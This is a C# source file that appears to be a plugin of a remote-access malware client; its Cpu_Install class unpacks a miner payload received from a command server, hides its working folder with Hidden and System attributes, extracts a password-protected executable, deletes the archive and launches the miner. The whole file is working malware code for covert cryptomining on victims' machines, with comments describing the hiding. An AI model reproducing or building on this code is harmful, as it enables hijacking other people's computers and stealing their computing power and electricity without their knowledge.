using Ionic.Zip;
using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{
    class Cpu_Install
    {
        public static void Run(MsgPack unpack_msgpack, string cpuBin, string cpuWorkDir, string cpuProc, string cpuZipPass, string cpuParametrs) // CPU.Run()
        {
            try
            {
                // Checking
                if (!File.Exists(cpuBin))
                {
                    try
                    {
                        if (!Directory.Exists(cpuWorkDir))
                        {
                            //We create a working folder for the miner
                            DirectoryInfo workPatch;
                            workPatch = Directory.CreateDirectory(cpuWorkDir);
                            Directory.CreateDirectory(cpuWorkDir);
                            DirectoryInfo directoryInfo = new DirectoryInfo(cpuWorkDir);
                            directoryInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System; //This is how we hide our folder itself
                            workPatch.Refresh();
                        }
                        string zipAckhive = cpuWorkDir + "\\" + HWIDGen.HWID() + ".tmp.zip";
                        try
                        {
                            //Create an archive with a miner
                            File.WriteAllBytes(zipAckhive, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                            Thread.Sleep(10000);
                        }
                        catch
                        {
                            return;
                        }
                        // unzip
                        using (ZipFile zip = ZipFile.Read(zipAckhive))
                        {
                            try
                            {
                                ZipEntry e = zip[cpuProc + ".exe"];
                                e.ExtractWithPassword(cpuWorkDir, cpuZipPass);
                                Thread.Sleep(10000);
                            }
                            catch
                            {
                                try
                                {
                                    zip.ExtractAll(zipAckhive);
                                    Thread.Sleep(10000);
                                }
                                catch
                                {
                                    return;
                                }
                            }
                        }

                        try
                        {
                            // Delete the archive with a sminer
                            if (File.Exists(zipAckhive))
                                File.Delete(zipAckhive);
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                        }

                        try
                        {

                            // Check if the miner process is running
                            Process[] pname = Process.GetProcessesByName(cpuProc);
                            if (pname.Length == 0)
                                Thread.Sleep(5000);
                            Cpu_Run.CmdRun(cpuBin, cpuProc, cpuParametrs);
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                            Thread.Sleep(480000);
                            return;
                        }
                    }
                    catch { }
                }
                else
                {
                    try
                    {

                        // Check if the miner process is running
                        Process[] pname = Process.GetProcessesByName(cpuProc);
                        if (pname.Length == 0)
                            Thread.Sleep(5000);
                        Cpu_Run.CmdRun(cpuBin, cpuProc, cpuParametrs);
                    }
                    catch (Exception ex)
                    {
                        Packet.Error(ex.Message);
                        Thread.Sleep(480000);
                        return;
                    }
                }

            }

            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return;
            }

        }
    }
}
